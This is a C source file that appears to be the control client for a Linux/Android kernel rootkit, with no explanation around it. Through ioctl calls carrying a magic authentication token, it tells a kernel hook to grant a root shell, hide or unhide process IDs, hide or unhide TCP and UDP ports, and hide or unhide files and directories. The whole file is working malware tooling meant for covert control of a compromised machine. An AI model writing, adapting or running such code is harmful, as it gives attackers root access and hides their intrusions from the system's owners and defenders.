#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>

#define AUTH_TOKEN 0x12345678

#define SHELL "/bin/sh" // Linux
//#define SHELL "/system/bin/sh" // Android

struct rk_proc_args {
    unsigned short pid;
};

struct rk_port_args {
    unsigned short port;
};

struct rk_file_args {
    char *name;
    unsigned short namelen;
};

struct rk_args {
    unsigned short cmd;
    void *ptr;
};

int main ( int argc, char *argv[] )
{
    struct rk_args rk_args;
    struct rk_proc_args rk_proc_args;
    struct rk_port_args rk_port_args;
    struct rk_file_args rk_file_args;
    int sockfd;
    int io;

    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    if(sockfd < 0){
      perror("socket");
      exit(1);
    }

    switch ( atoi(argv[1]) )
    {
        case 0:
            printf("Dropping to root shell\n");
            rk_args.cmd = 0;
            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            execl(SHELL, "sh", NULL);
            break;

        case 1:
            {
                unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Hiding PID %hu\n", pid);

                rk_proc_args.pid = pid;
                rk_args.cmd = 1;
                rk_args.ptr = &rk_proc_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 2:
            {
                unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Unhiding PID %hu\n", pid);

                rk_proc_args.pid = pid;
                rk_args.cmd = 2;
                rk_args.ptr = &rk_proc_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 3:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Hiding TCPv4 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 3;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 4:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Unhiding TCPv4 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 4;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;
        case 5:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Hiding TCPv6 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 5;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 6:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Unhiding TCPv6 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 6;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 7:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Hiding UDPv4 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 7;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 8:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Unhiding UDPv4 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 8;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 9:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Hiding UDPv6 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 9;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 10:
            {
                unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

                printf("Unhiding UDPv6 port %hu\n", port);

                rk_port_args.port = port;
                rk_args.cmd = 10;
                rk_args.ptr = &rk_port_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 11:
            {
                char *name = argv[2];

                printf("Hiding file/dir %s\n", name);

                rk_file_args.name = name;
                rk_file_args.namelen = strlen(name);
                rk_args.cmd = 11;
                rk_args.ptr = &rk_file_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 12:
            {
                char *name = argv[2];

                printf("Unhiding file/dir %s\n", name);

                rk_file_args.name = name;
                rk_file_args.namelen = strlen(name);
                rk_args.cmd = 12;
                rk_args.ptr = &rk_file_args;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        case 100:
            {
                printf("Null command\n");

                rk_args.cmd = 100;

                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
            }
            break;

        default:
        {
            struct ifconf ifc;
            printf("No action\n");
            io = ioctl(sockfd, SIOCGIFCONF, &ifc);
        }
            break;
    }

    if(io < 0){
      perror("ioctl");
      exit(1);
    }

    return 0;
}
